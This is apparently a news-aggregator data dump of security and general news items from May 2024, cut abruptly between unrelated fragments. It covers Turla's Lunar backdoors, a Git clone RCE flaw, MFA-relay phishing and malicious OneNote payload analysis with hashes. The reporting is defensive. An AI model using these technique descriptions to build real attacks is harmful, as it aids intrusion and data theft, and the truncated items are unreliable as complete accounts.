reform-minded DAs elected in places like Philadelphia and St. Louis.\nSince then, the new research showed, the numbers ballooned to 53 attempts introduced in 26 states. Texas is home to at least 13 such efforts, including bills that further criminalize abortion and make it easier to file complaints against and investigate DAs who decline to prosecute certain offenses.\nWhile the bulk of legislation introduced between 2017 and 2022 didn\u2019t pass, newer bills have been more successful. Fifteen new measures have been enacted in 14 states since last year.\nTexas enacted a law last year that makes it easier to bring private lawsuits to remove prosecutors, Habig added. Now the state is following the example set by Georgia and considering creating a new government agency for the same purpose.\n\u201cThe bills introduced and passed in the last year show that the trend from 2017-22 has not stopped \u2014 in fact, it\u2019s only accelerating,\u201d Habig said. \u201cAnd states that have taken some efforts to restrict prosecutorial discretion have shown that they are not satisfied with their early steps.\u201d", "hash": "9d912d40ca53fd4eedd64fa4e1f11ca8465e3444ebd0c4996f43e929a1676017", "id": "0b542b5a-741b-4516-bda9-86004f96346c", "link": "https://theintercept.com/2024/05/16/abortion-reform-prosecutors-attack-right-wing-gop-legislatures/", "osint_source_id": "a87d9c83-841f-455b-9e28-f8d5df3a6fb5", "published": "2024-05-16T13:00:00", "source": "https://theintercept.com/feed/?rss", "story_id": "9aebf284-8750-487b-8da3-c99221e8aa52", "title": "Republicans Can't Decide: Do They Hate Prosecutors Because of Bail Reform or Abortion?"}], "tags": {"Andrew Warren": {"name": "Andrew Warren", "tag_type": "PER"}, "Arizona": {"name": "Arizona", "tag_type": "LOC"}, "DAs": {"name": "DAs", "tag_type": "ORG"}, "DeSantis": {"name": "DeSantis", "tag_type": "PER"}, "Democrat": {"name": "Democrat", "tag_type": "MISC"}, "Democratic": {"name": "Democratic", "tag_type": "MISC"}, "Democratic Party": {"name": "Democratic Party", "tag_type": "ORG"}, "Dobbs": {"name": "Dobbs", "tag_type": "PER"}, "Florida": {"name": "Florida", "tag_type": "LOC"}, "Georgia": {"name": "Georgia", "tag_type": "Country"}, "Habig": {"name": "Habig", "tag_type": "PER"}, "Idaho": {"name": "Idaho", "tag_type": "LOC"}, "Indiana": {"name": "Indiana", "tag_type": "LOC"}, "Jackson": {"name": "Jackson", "tag_type": "PER"}, "Jill Habig": {"name": "Jill Habig", "tag_type": "PER"}, "Jose Garza": {"name": "Jose Garza", "tag_type": "PER"}, "Katie Hobbs": {"name": "Katie Hobbs", "tag_type": "PER"}, "Philadelphia": {"name": "Philadelphia", "tag_type": "LOC"}, "Public Rights Project": {"name": "Public Rights Project", "tag_type": "ORG"}, "Republican": {"name": "Republican", "tag_type": "MISC"}, "Republicans": {"name": "Republicans", "tag_type": "MISC"}, "Ron DeSantis": {"name": "Ron DeSantis", "tag_type": "PER"}, "South Carolina": {"name": "South Carolina", "tag_type": "LOC"}, "Supreme Court": {"name": "Supreme Court", "tag_type": "ORG"}, "Texas": {"name": "Texas", "tag_type": "LOC"}, "Warren": {"name": "Warren", "tag_type": "PER"}, "Wisconsin": {"name": "Wisconsin", "tag_type": "LOC"}}, "title": "Republicans Can't Decide: Do They Hate Prosecutors Because of Bail Reform or Abortion?"}, {"attributes": [{"created": "2024-05-16T17:15:33.593167", "id": "2d0ef7d7-8a10-46b0-9375-22840ce3bd68", "key": "NLP_BOT", "value": "3"}], "created": "2024-05-16T12:35:47", "id": "c80fed9e-db9b-4db4-b1dc-b13a9f84b4df", "news_items": [{"author": "", "content": "Geoengineering-Experiment wegen Gesundheitsbedenken gestoppt\nUS-Amerikanische Forschende haben ein Ger\u00e4t entwickelt, das optisch etwas an eine Schneekanone erinnert und winzige Salzwassertr\u00f6pfchen verspr\u00fcht.

The guidance from NCSC and the insurance industry subtly suggests this position may be softening.\nBut any change remains subtle. Felicity Oswald, the NCSC's chief executive, stressed that the agency still \u201cdoes not encourage, endorse or condone paying ransoms, and it\u2019s a dangerous misconception that doing so will make an incident go away or free victims of any future headaches.\u201d\nThe growing strength of the ransomware ecosystem has been a challenge to government for the past five years. Officials in Westminster have been urged to put more money behind operations to disrupt the gangs involved by experts who believe the current approach isn\u2019t working.\n\u201cRansomware remains the biggest day-to-day cyber security threat to UK organizations with attacks rising and the ransomware model continuing to evolve,\u201d the NCSC stated, adding that it \u201ccontinues to strongly discourage the payment of ransoms.\u201d\nNewly published regulator data shows that the United Kingdom was hit by more ransomware attacks last year than ever before, with several sectors \u2014 central government, local government, and the utilities sector \u2014 suffering more incidents in 2023 than in all previous years combined.\nThe new guidance does not meet several of the recommendations made by the RUSI report \u2014 including, independently of the insurance industry, that the government rethinks its approach to ransomware as a matter of urgency \u2014 although it suggests there is a developing relationship between the government and the insurance sector that could help develop those proposals in the future.\nAmong the recommendations in the RUSI report was that the insurance industry introduce a \u201crequirement for policyholders to notify the NCSC and the NCA in the event of an attack and before a ransom is paid.\u201d\nThe report also encouraged the insurance industry \u201cto create a set of minimum ransomware controls based on threat intelligence and insurers\u2019 claims data\u201d that would be a basic requirement for companies that want their insurance policies to cover ransomware attacks.\nMervyn Skeet, the director of general insurance policy at the Association of British Insurers, said: \u201cThis collaborative guidance is another positive step towards tackling cyber crime across the UK, and we look forward to continuing to work with NCSC on this shared goal.\u201d\nAlexander Martin\nis the UK Editor for Recorded Future News.

As these industries increasingly adopt automation, interconnected devices, and digital technologies, they become more vulnerable to cyber threats.\nThe case study details the Boston Beer Company\u2019s implementation of the Dragos Platform and OT Watch threat hunting service to secure its four US breweries, which resulted in 100% ROI in its first year and a modernized infrastructure. The Boston Beer Company is the organization behind brands like Samuel Adams, Dogfish Head, Truly, Twisted Tea, and Angry Orchard.\nDownload the Boston Beer Company Case Study\nGet the full story on how the Boston Beer Company leveraged Dragos technology and solutions to secure its operational technology infrastructure at four US breweries.\nDownload NowA few key points from the case study include:\nProblem: When Brandon Catalan joined as Chief Information Security Officer (CISO) in 2021, the company had invested in IT cybersecurity programs, but struggled to keep up with the resource demands required to maintain its systems. Both corporate IT security and OT security at the company\u2019s breweries were targeted for modernization.\n-\nSolution: Catalan ran a strategic tabletop exercise simulating a ransomware scenario which revealed the company\u2019s vulnerabilities and catalyzed the search for an advanced OT cybersecurity platform. The company chose Dragos as a partner for its ability to provide comprehensive security for OT/ICS systems.\n-\nThe Dragos Platform: The platform delivers enhanced visibility, monitoring, and control of OT environments, automates discovery, management, and monitoring of all assets within the OT environment, provides corrected, enriched, prioritized guidance for managing vulnerabilities, rapidly pinpoints malicious activity in OT/ICS networks, and facilitates comprehensive incident investigation. The Dragos Platform was first deployed in the company\u2019s IT infrastructure before implementing it across all four of the company\u2019s US breweries. The platform helped in identifying root causes of operational issues, inventory assets through real-time network schematics, and troubleshoot operational issues.\n-\nOT Watch: This service adds an essential layer of advanced and scalable industrial threat hunting to the cybersecurity capabilities of the Dragos Platform. It hunts for key steps an attacker must perform to install their tools, gain access, propagate access, and achieve desired outcomes.\n-\nThe Results Speak for Themselves\nBoston Beer\u2019s implementation of the Dragos Platform and OT Watch resulted in:\nAlignment between IT and OT teams, leadership, and the board about the importance of securing OT environments\n-\nA 15% year-over-year reduction in cybersecurity insurance premiums\n-\nA 100% ROI in the first year of a five-year investment\n-\nA 300% increase in employees identifying and submitting suspicious emails.\n-\nDownload the case study to learn more.\nReady to put your insights into action?\nTake the next steps and contact our team today.", "hash": "b00a635bc32e6c4a46d221f2d9deab9c1df98022df10a513171f741ad9e73f49", "id": "c2de87af-b1a2-4009-aa5a-1e3b27e7e0f1", "link": "https://www.dragos.com/blog/boston-beer-secures-its-manufacturing-environments-with-dragos-platform-ot-watch/", "osint_source_id": "bd1a9f9b-dfec-4ed0-bb31-2f1cb5dcc211", "published": "2024-05-16T12:00:00", "source": "https://dragos.com/feed/", "story_id": "9141585c-bd28-475b-9348-8469c023cd31", "title": "Boston Beer Secures its Manufacturing Environments with the Dragos Platform and OT Watch"}], "tags": {"Boston Beer Company": {"name": "Boston Beer Company", "tag_type": "ORG"}, "Brandon Catalan": {"name": "Brandon Catalan", "tag_type": "PER"}, "CISO": {"name": "CISO", "tag_type": "ORG"}, "Chief Information Security Officer": {"name": "Chief Information Security Officer", "tag_type": "ORG"}, "Dragos": {"name": "Dragos", "tag_type": "PER"}, "ROI": {"name": "ROI", "tag_type": "ORG"}, "Samuel Adams": {"name": "Samuel Adams", "tag_type": "PER"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}}, "title": "Boston Beer Secures its Manufacturing Environments with the Dragos Platform and OT Watch"}, {"attributes": [{"created": "2024-05-16T17:09:38.605590", "id": "ad03c191-df86-458b-a636-7c8c09d795a2", "key": "WORDLIST_BOT", "value": "2"}, {"created": "2024-05-16T17:15:18.903973", "id": "dda3e1be-b43e-444e-a168-9ca0ae755f4e", "key": "IOC_BOT", "value": "1"}, {"created": "2024-05-16T17:21:34.993186", "id": "a4002a7d-d891-463a-8a66-22104abc93c6", "key": "NLP_BOT", "value": "10"}], "created": "2024-05-16T12:00:00", "id": "8591404d-17a5-4b8b-bc71-c04b91a5fc25", "news_items": [{"author": "CISA", "content": "Rockwell Automation FactoryTalk View SE\n1.

The loader uses the DNS domain name for decryption and ensures that it runs only within the targeted environment.\nOnce the Lunar backdoors are running on the host, the attackers may send commands directly via the command and control (C2) server and use stolen credentials and compromised domain controllers for lateral movement on the network.\nLunarWeb and LunarMail\nThe two Lunar backdoors are designed for prolonged and covert surveillance, data theft, and maintaining control over compromised systems, such as high-value targets like government and diplomatic institutions.\nLunarWeb is deployed on servers, mimicking legitimate traffic by spoofing HTTP headers from Windows and ESET product updates.\nIt receives commands for execution which are hidden in .JPG and .GIF image files using the steganopraphy technique.\nThe commands LunarWeb supports include executing shell and PowerShell commands, collecting system information, running Lua code, zipping files, and exfiltrating data in AES-256 encrypted form.\nESET researchers say that they observed an attack where the threat actor dropped LunarWeb at three diplomatic institutions of the targeted European Ministry of Foreign Affairs just minutes apart.\nThe attacker may have been able to move this quickly because they had previously gained access to the domain controller of the ministry and leveraged it to move to machines from other institutions on the network.\nLunarMail is deployed on user workstations with Microsoft Outlook installed.\nIt uses an email-based communication system (Outlook MAPI) for data exchange with specific Outlook profiles linked to the C2 to evade detection in environments where HTTPS traffic may be more closely monitored.\nCommands sent from the C2 are embedded in email attachments, typically hidden in .PNG images, which the backdoor parses to extract the hidden instructions.\nLunarMail can create processes, take screenshots, write files, and run Lua code. Lua script execution allows it to indirectly run shell and PowerShell commands if needed.\nBased on similarities in observed tactics, techniques, and procedures (TTPs) between the Lunar toolset and and past activities, ESET attributes the backdoors to the Russian hacking group Turla with medium confidence.\nHowever, the researchers noticed \"varying degrees of sophistication in the compromises,\" which suggests that the tools were developed and operated by multiple individuals.\nDespite the intrusions being of a more recent date, ESET found artifacts indicating that the backdoors have been used in operations and evaded detection since at least 2020.\nThe cybersecurity company is providing a list of indicators of compromise (IoCs) for files, file paths, network, and registry keys observed in compromised environments.

Extending access to the value derived from them to the public is seen as an effective way to raise resilience across the whole of the country.\nNCSC has several other programs intended to benefit the general public based on the use of the intelligence gained from these feeds. As previously reported by Recorded Future News, these include detecting the beginnings of ransomware attacks and then tipping off the target so that defensive measures can be put in place.\nAnother service launched at CyberUK will allow high-risk individuals to configure their mobile devices to run through the same Protective DNS system used to stop cyberattacks from impacting government networks, including candidates in the expected general election later this year.\nUnder Share and Defend, the same blocklists used to protect high-risk individuals and networks will be shared with internet service providers (ISPs) and other organizations who can add the domains to their own DNS platforms, hopefully providing the same level of security for ordinary internet users across the entirety of the country.\n\u201cIf a defending partner is using our data to protect their customers, access to malicious content (such as a fake shop, a phishing site, or a malicious link in an email or text message) is automatically blocked,\u201d explained NCSC.\n\u201cAlthough customers don\u2019t need to do anything to benefit from this protection, we encourage all members of the public to remain vigilant when using online services, accounts and devices as the service can only offer protection against known malicious threats.\u201d\nShare and Defend remains a voluntary system, and it will be up to individual ISPs to implement it.The first organizations to be enrolled are BT and Jisc, a not-for-profit used by most of the higher education sector in Britain.

That\u2019s a great thing. But as security evolves, so do cybercriminals who are always looking for new ways to scam us.\nA type of phishing we\u2019re calling authentication-in-the-middle is showing up in online media. While these techniques, named after man-in-the-middle (MitM) attacks, have existed for a while, they appear to be gaining traction now.\nIt works like this: A user gets lured to a phishing site masquerading as a site they normally use, such as a bank, email or social media account. Once the user enters their login into the fake site, that information gets redirected by the cybercriminals to the actual site, without the user knowing.\nThe user is then prompted for their MFA step. They complete this, usually by entering a code or accepting a push notification, and this information is then relayed to the criminals, allowing them to login to the site.\nOnce the criminals are into an account, they can start changing settings like the account\u2019s email address, phone number, and password, so the user can no longer log in, or they can simply clean out a bank account. This may help you understand why many platforms ask for your PIN or other authentication again when you try to change one of these important settings.\nVictims are lured to phishing sites like these via links from social media or emails where it can be hard to identify the real link. Phishing sites can even show up in sponsored search results, in the same way as we reported about tech support scams.\nHow to protect yourself from authentication-in-the-middle attacks\nKeep your wits about you. Being aware of how scammers work is the first step to avoiding them. Don\u2019t assume sponsored search results are legit, and trust that if something seems suspicious then it probably is.\n-\nUse security software. Many security programs block known phishing sites, although domains are often short-lived and get rotated quickly. Malwarebytes Browser Guard can help protect you.\n-\nUse a password manager. Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.\n-\nConsider passkeys. Multi-factor authentication is still super-important to enable, and will protect you from many types of attacks, so please continue to use it. However, authentication-in-the-middle attacks only work with certain types of MFA, and passkeys won\u2019t allow the cybercriminals to login to your account in this way. Many services have already begun using passkeys and they\u2019re no doubt here to stay.\n-\nWe don\u2019t just report on threats\u2014we remove them\nCybersecurity risks should never spread beyond a headline.

It can be installed on machines running Windows, macOS, Linux, and various *BSD distributions.\nWeb-based software development platforms GitHub and GitLab are based on Git. Visual Studio, Microsoft\u2019s integrated development environment, has Git tooling (MinGit) built directly into it, and other IDEs rely on it.\nCVE-2024-32002 and other fixed vulnerabilities\nCVE-2024-32002 is a critical vulnerability that allows specially crafted Git repositories with submodules to trick Git into writing files into a .git/ directory instead of the submodule\u2019s worktree.\n\u201cThis is possible by a combination of confusing Git with a directory and a symbolic link that differs only in case so that Git can write either one, or the other, but not both. This confusion can be used to manipulate Git into writing a hook that will be executed while the clone operation is still running, giving the user no opportunity to inspect the code that is being executed,\u201d Git for Windows maintainer Johannes Schindelin explained.\nCVE-2024-32004 also allows remote code execution, but only on multi-user machines: \u201cAn attacker can prepare a local repository so that it looks like a partial clone that is missing an object, so that, when this repository is cloned, Git will execute arbitrary code during the operation with full permissions of the user performing the clone.\u201d\nCVE-2024-32465 may allow attackers to bypass protections for cloning untrusted repositories, CVE-2024-32020 may allow untrusted users to modify objects in the cloned (local) repository, and CVE-2024-32021 may be used to manipulate Git into writing files outside the Git worktree and outside the .git/ directory.\nFixes and security changes\nThe vulnerabilities have been patched in Git v2.45.1, v2.44.1, v2.43.4, v2.42.2, v2.41.1, v2.40.2, and v2.39.4.\nHe also shared that more changes have been made to Git to make the cloning process more secure: improvements to protect against remote code execution, better handling of symbolic links and directories, a more secure way of running hooks (scripts), and more.\n\u201cUpgrading to the latest Git version is essential to protect against these vulnerabilities. If you cannot update immediately, please be careful from where you clone repositories,\u201d Schindelin advised.\nFixed versions of Git have been embedded in the latest GitHub Desktop releases (for Windows and macOS). Fixes (1, 2) for CVE-2024-32002 and CVE-2024-32004 have been implemented in Visual Studio.", "hash": "b1cce12629071d247901210c872190f58dbfd34e306dc272597bd2313e6980a1", "id": "dd1b5e8a-6b82-4a79-8ff9-1b23214afcaf", "link": "https://www.helpnetsecurity.com/2024/05/16/git-cve-2024-32002/", "osint_source_id": "c5bebd4b-5715-4589-a65c-0344a226ab6f", "published": "2024-05-16T11:14:57", "source": "https://www.helpnetsecurity.com/feed", "story_id": "2762ba86-61a1-46cc-96c3-420f120b7eae", "title": "Critical Git vulnerability allows RCE when cloning repositories with submodules (CVE-2024-32002)"}], "tags": {"CVE-2024-32002": {"name": "CVE-2024-32002", "tag_type": "cves"}, "CVE-2024-32004": {"name": "CVE-2024-32004", "tag_type": "cves"}, "CVE-2024-32020": {"name": "CVE-2024-32020", "tag_type": "cves"}, "CVE-2024-32021": {"name": "CVE-2024-32021", "tag_type": "cves"}, "CVE-2024-32465": {"name": "CVE-2024-32465", "tag_type": "cves"}, "GitHub Desktop": {"name": "GitHub Desktop", "tag_type": "MISC"}, "GitLab": {"name": "GitLab", "tag_type": "ORG"}, "Johannes Schindelin": {"name": "Johannes Schindelin", "tag_type": "PER"}, "Linux": {"name": "Linux", "tag_type": "MISC"}, "Microsoft": {"name": "Microsoft", "tag_type": "ORG"}, "RCE": {"name": "RCE", "tag_type": "ORG"}, "Schindelin": {"name": "Schindelin", "tag_type": "PER"}, "Web-based": {"name": "Web-based", "tag_type": "MISC"}, "Windows": {"name": "Windows", "tag_type": "MISC"}, "macOS": {"name": "macOS", "tag_type": "MISC"}}, "title": "Critical Git vulnerability allows RCE when cloning repositories with submodules (CVE-2024-32002)"}, {"attributes": [{"created": "2024-05-16T17:16:50.512649", "id": "83612063-7111-4e04-930b-500466629ef7", "key": "NLP_BOT", "value": "2"}], "created": "2024-05-16T11:12:34", "id": "0a5386f7-0922-4655-96f9-45e1282e2edb", "news_items": [{"author": "", "content": "So stabil ist das d\u00fcnnste iPad aller Zeiten\nApple brachte k\u00fcrzlich mit dem 5,1 mm dicken iPad Pro das bisher d\u00fcnnste iPad aller Zeiten auf den Markt.

A new, more prominent screen indicator coming to Android devices later this year will always let you know when screen sharing is active, and you can stop sharing with a simple tap,\u201d Google explains.\nTo protect users from threat actors relying on cell site simulators to snoop on them or send them fraudulent SMS messages, Android 15 will notify users when the cellular network connection is unencrypted, and will alert at risk-users if a cellular base station or surveillance tool is recording their location. Compatible hardware and device OEM integration is required for both features.\nAdditionally, Google is updating the Play Integrity API to allow developers to check whether other running applications could be capturing the screen, displaying overlays, or controlling the device, and to check whether Play Protect is working and if the device is clean before performing sensitive actions.\nDevelopers will also have the option to receive information on recent device activity and check if there are too many integrity checks performed, which could indicate an attack. The developers will be able to set their applications to warn the user or turn on Play Protect before continuing.\nLater this year, Android will also require that applications demonstrate the need to access users\u2019 photos and videos, while photo picker will support both cloud and local storage search.\nRelated: Google Blocked 2.28 Million Apps from Google Play Store in 2023\nRelated: Unwanted Tracking Alerts Rolling Out to iOS, Android\nRelated: Google Announces Enhanced Fraud Protection for Android", "hash": "16e7cf0082cf4a39c2789151c3986e15cf16a6da9cea5ab2303daa46ef6c243f", "id": "41394eff-581c-4771-af95-2d78ce4ce433", "link": "https://www.securityweek.com/android-15-brings-improved-fraud-and-malware-protections/", "osint_source_id": "12f6122e-c3f7-4d6c-813e-db39f757e369", "published": "2024-05-16T11:09:41", "source": "https://feeds.feedburner.com/Securityweek?format=xml", "story_id": "d55d7200-82ab-41bd-9550-87a14141a298", "title": "Android 15 Brings Improved Fraud and Malware Protections"}], "tags": {"AI-powered": {"name": "AI-powered", "tag_type": "MISC"}, "Android": {"name": "Android", "tag_type": "MISC"}, "Android 13": {"name": "Android 13", "tag_type": "MISC"}, "Android 15": {"name": "Android 15", "tag_type": "MISC"}, "Google": {"name": "Google", "tag_type": "ORG"}, "Google Play Protect": {"name": "Google Play Protect", "tag_type": "MISC"}, "Lenovo": {"name": "Lenovo", "tag_type": "ORG"}, "Nothing": {"name": "Nothing", "tag_type": "ORG"}, "OnePlus": {"name": "OnePlus", "tag_type": "ORG"}, "Oppo": {"name": "Oppo", "tag_type": "ORG"}, "SMS": {"name": "SMS", "tag_type": "MISC"}, "Sharp": {"name": "Sharp", "tag_type": "ORG"}, "Transsion": {"name": "Transsion", "tag_type": "ORG"}}, "title": "Android 15 Brings Improved Fraud and Malware Protections"}, {"attributes": [{"created": "2024-05-16T17:18:11.638412", "id": "4f16c233-d6e3-4730-a1b4-b80af6d7e767", "key": "NLP_BOT", "value": "9"}], "created": "2024-05-16T11:03:58", "id": "02ca548a-0596-4d10-ad19-340ec7c9b57e", "news_items": [{"author": "Bruce Schneier", "content": "Zero-Trust DNS\nMicrosoft is working on a promising-looking protocol to lock down DNS.\nZTDNS aims to solve this decades-old problem by integrating the Windows DNS engine with the Windows Filtering Platform\u2014the core component of the Windows Firewall\u2014directly into client devices.\nJake Williams, VP of research and development at consultancy Hunter Strategy, said the union of these previously disparate engines would allow updates to be made to the Windows firewall on a per-domain name basis.

Sie sollen die Plattform einsetzen k\u00f6nnen, die am besten zu ihren individuellen Bed\u00fcrfnissen passt. Neben VMware und Microsoft unterst\u00fctzte der Anbieter zuvor bereits Nutanix AHV, Oracle Linux Virtualization Manager und Red Hat Virtualization sowie in der Cloud AWS, Azure und die GCP.\nIn diesem Workshop erhalten Sie effiziente Strategien f\u00fcr eine m\u00f6glichst schmerz- und ausfallfreie Migration und f\u00fchren diese w\u00e4hrend der Schulung selbst in einem Labor durch.

Nun wurde endlich nachgewogen.\nDas in dieser Woche erschienene iPad Pro M4 hat abgespeckt: Es ist sowohl d\u00fcnner als auch leichter geworden. So wiegt etwa das 13-Zoll-Modell mit WLAN nun 579 Gramm statt beim Vorg\u00e4nger mit M2-SoC noch 682 Gramm und die Dicke schrumpfte von 6,4 Millimeter auf 5,1 Millimeter. Die Frage, die sich viele potenzielle K\u00e4ufer allerdings nach wie vor stellten, ist, wie die Gewichtsverh\u00e4ltnisse zusammen mit dem ebenfalls aktualisierten Magic Keyboard aussehen. Die nun teilweise aus Alu gefertigte Kombination aus Tastatur und Trackpad plus iPad-H\u00fclle wird von Apple zwar seit letzter Woche offiziell im Apple Online Store gelistet, doch der Hersteller nannte kein Gewicht.\nZwischen 21 und 43 Gramm leichter\nNun wurde erstmals nachgewogen, wie aus den USA zu h\u00f6ren ist. Die US-englische Tastatur des 11-Zoll-Modells ist demnach jetzt 580 Gramm schwer, ein Minus von 21 Gramm. Beim 13-Zoll-Modell soll das Gewicht des neuen Magic Keyboard bei rund 667 Gramm liegen \u2013 ebenfalls f\u00fcr die US-Version. Hier h\u00e4tte Apple sogar gut 43 Gramm gegen\u00fcber dem f\u00fcr das 12,9-Zoll-Vormodell eingespart. Ausgestattet mit diesen Werten, kann gepr\u00fcft werden, wie schwer die Kombination aus iPad und Tastatur ausf\u00e4llt.\nDie 13-Zoll-Variante des IPad Pro M2 kommt damit sehr genau an das MacBook Air M3 mit 13 Zoll heran, liegt allerdings noch etwas dr\u00fcber. Die US-Version von Apples aktuell leichtesten Mac-Notebook bringt knapp 1240 Gramm auf die Waage. Rechnet man iPad Pro M4 mit 13 Zoll und passendem US-Magic-Keyboard zusammen, w\u00e4ren es zusammen 1246 Gramm (WLAN-Version). Die Vorg\u00e4ngerbaureihe mit 12,9 Zoll und M2-SoC war noch deutlich schwerer: in Kombination genau 146 Gramm (1392 Gramm total).\nMacBook mit 12 Zoll nicht geschlagen\nWer jedoch mit 11 Zoll auskommt, kann noch mehr Gewicht sparen. Unter einem Kilo kommt Apple allerdings nicht heraus: Das kleinere Tablet erreicht zusammen mit dem Magic Keyboard insgesamt 1024 Gramm mit WLAN, mit 5G sind es nur 2 Gramm mehr. Beeindruckend ist bei beiden Varianten, dass das iPad Pro M4 jeweils leichter ausf\u00e4llt als Tastatur und Trackpad.\nDas iPad Pro M4 mit 13 Zoll ist Apples bislang d\u00fcnnstes Produkt, das sogar den alten iPod nano schl\u00e4gt. Was dem Konzern in seinem Angebot allerdings nach wie vor fehlt, ist ein besonders leichtes Notebook. Das MacBook mit 12 Zoll, das es von 2015 bis 2019 mit Intel-Chip gab, wurde nie in das Apple-Silicon-Zeitalter \u00fcberf\u00fchrt. Es brachte nur 920 Gramm auf die Waage, also sogar weniger als iPad Pro M4 mit 11 Zoll und Magic Keyboard.\nEmpfohlener redaktioneller Inhalt\nMit Ihrer Zustimmmung wird hier ein externer Preisvergleich (heise Preisvergleich) geladen.\nIch bin damit einverstanden, dass mir externe Inhalte angezeigt werden.

The site, run by the ShinyHunters hacking group, was set up in June 2023, a month after its earlier incarnation was disrupted by the arrest of its creator and administrator, Conor Brian Fitzpatrick (also known as \"pompompurin\").\n21-year-old Fitzpatrick was sentenced to time served and 20 years of supervised release in January, banned from using the internet for the first year, and required to have monitoring software installed on his computer.\nFitzpatrick had created BreachForums after its predecessor, RaidForums, was shut down in April 2022, and its alleged administrator Diogo Santos Coelho arrested.\nAre you noticing a trend?

Our analysis of roughly 6,000 malicious OneNote samples from WildFire reveals that these samples have a phishing-like theme where attackers use one or more images to lure people into clicking or interacting with OneNote files. The interaction then executes an embedded malicious payload.\nSince macros have been disabled by default in Office, attackers have turned to leveraging other Microsoft products for embedding malicious payloads. As a result, malicious OneNote files have grown in popularity. The OneNote desktop app is included by default in Windows in Office 2019 and Microsoft 365, which can load malicious OneNote files if someone accidentally opens one.\nWe find that attackers have the freedom to embed either text-based malicious scripts or binary files inside OneNote. This offers them more flexibility compared to traditional macros in documents.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation Firewall with cloud-delivered security services including WildFire.\n-\nPrisma Access devices with cloud-delivered security services including WildFire.\n-\nCortex XDR and XSIAM agents help protect against post-exploitation activities using the multi-layer protection approach.\n-\nThe Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.\n-\nRelated Unit 42 Topics | Microsoft, Phishing |\nTable of Contents\nBackground\nMethodology\nPayload Types and Average Size Distribution\nPresence of Images in Malicious OneNote Samples\nAnalysis of an Embedded EXE Payload\nConclusion\nIndicators of Compromise\nAdditional Resources\nBackground\nMicrosoft OneNote is a digital note-taking application that is part of the Microsoft Office suite. A OneNote file is essentially a digital notebook where people can store various types of information.\nAdditionally, Microsoft OneNote allows people to embed external files, enabling them to store files such as videos, images or even scripts and executables. However, Microsoft has started blocking embedded objects with certain extensions that are considered dangerous within OneNote files running on Microsoft 365 on Windows.\nHowever, attackers often abuse the ability to embed objects by planting malicious payloads. Malicious OneNote samples typically disguise themselves as legitimate notes, often including an image and a button.\nAttackers use images to draw people\u2019s attention, and they rely on unsuspecting people clicking buttons to launch malicious payloads. This technique is popular for payload delivery as it leverages people\u2019s trust in legitimate note-taking applications.\nFigures 1, 2 and 3 show three different varieties of malicious OneNote samples with different types of embedded images and buttons. By hovering over the fake button, we can see the location and type of the payload planted in the OneNote file.\nIn Figure 1, the malicious OneNote sample asks the target to click on the view button to see the \u201cprotected\u201d document. Upon doing so, a malicious VBScript file executes.\nSimilarly, Figures 2 and 3 show malicious OneNote documents with fake buttons that entice victims to execute an embedded EXE payload and an Office 97-2003 payload, respectively.\nMethodology\nAs mentioned above, attackers mostly abuse OneNote files for malicious payload delivery. To do so, they tend to embed a few specific payload types such as the following:\nJavaScript\n-\nVBScript\n-\nPowerShell\n-\nHTML application (HTA)\n-\nDespite the different file types, these payloads often show similar behaviors and aim to achieve the same malicious objectives. However, we won't delve into the entire attack and infection chain, as we have covered this in a previous article on malicious OneNote attachments.\nThe telltale sign of a malicious OneNote file is the presence of embedded objects. While benign OneNote files can also contain embedded objects, malicious OneNote files almost invariably include them.\nAccording to Microsoft, files embedded in OneNote start with a specific globally unique identifier (GUID) tag:\n{BDE316E7-2665-4511-A4C4-8D4D0B7A9EAC}\n-\nThis GUID indicates the presence of a FileDataStoreObject object. The GUID is then followed by the size of the embedded file.\nThe actual embedded file follows 20 bytes after the aforementioned GUID tag and will be as long as the defined size. For example, in Figure 4 below:\nBox 1 represents the embedded object GUID tag\n-\nBox 2 indicates the size of the embedded object\n-\nBox 3 represents the actual embedded object\n-\nPayload Types and Average Size Distribution\nAs illustrated in Figure 5, attackers predominantly use the following seven file types for their OneNote payloads:\nPowerShell\n-\nVBScript\n-\nBatch\n-\nHTA\n-\nOffice 97-2003\n-\nEXE\n-\nJavaScript (this file type is the most commonly used)\n-\nWe also extracted and noted the size of each payload type, as shown in Figure 6.\nWhile larger binary embedded payloads such as EXE and Office 97-2003 are more capable, attackers tend to use them less often (as shown in Figure 5) because they increase the overall size of the OneNote sample. Attackers tend to prefer a smaller overall file size, as smaller-sized malware is easier to include in common malware delivery mechanisms such as email attachments, thus raising less suspicion.\nAs illustrated in Figure 6 above, embedded malicious EXE and Office 97-2003 file payloads tend to be larger, and embedded malicious HTA and JavaScript files tend to be smaller.\nPresence of Images in Malicious OneNote Samples\nAttackers creating malicious OneNote lures use images that look like buttons to trick people into launching harmful payloads. We mapped out the number of images in each malicious OneNote sample with the payload type, and then calculated the median number of images.\nIn analyzing the 6,000 samples in our dataset, we found that all but three (99.9%) of the malicious OneNote samples contained at least one image. Since almost all of the samples contain at least one image, we can confirm our hypothesis that OneNote samples are primarily used as phishing vehicles.\nFigure 7 shows that the median number of images per payload type is two. For instance, attackers could use both a fake button and an attention-grabbing image like a fake \u201csecure\u201d document banner to make their phishing campaign more believable (such as in Figure 3).\nThe chart above demonstrates that two to three images typically accompany payloads in malicious OneNote samples, some used to make the document more believable and some serving as fake buttons.\nAnalysis of an Embedded EXE Payload\nWhile our previous research examined OneNote samples that carry the more common and popular payload types, such as PowerShell or HTA, EXE payloads have gotten less attention. In this section, we will analyze a OneNote sample with an embedded EXE payload.\nThe payload below is extracted from a OneNote sample with the following SHA256 hash:\nd48bcca19522af9e11d5ce8890fe0b8daa01f93c95e6a338528892e152a4f63c\n-\nThe payload itself has the following SHA256 hash:\n92d057720eab41e9c6bb684e834da632ff3d79b1d42e027e761d21967291ca50\n-\nFigure 8 shows our analysis of the EXE payload in IDA Pro. We found a handful of code blocks, which often signal that we might be dealing with shellcode.\nOur assumption was confirmed by the existence of GS:60, which points to the Process Environment Block (PEB) and the rotate right (ROR) instruction. This indicates that the malware is using dynamic address resolution for functions and hashing for function identification.\nTo get an understanding of the objective of the shellcode and identify the libraries it was dynamically loading, we opened it in the x64dbg debugger. We then put a breakpoint at the function that repeatedly calls the loc_140004021 function block in a loop, as shown in Figure 9.\nThe combination of the WSAStringToAddressA function (shown in Figure 10) and WSASocketW functions (shown in Figure 11) makes it clear that the shellcode is attempting to send or receive data by establishing a network 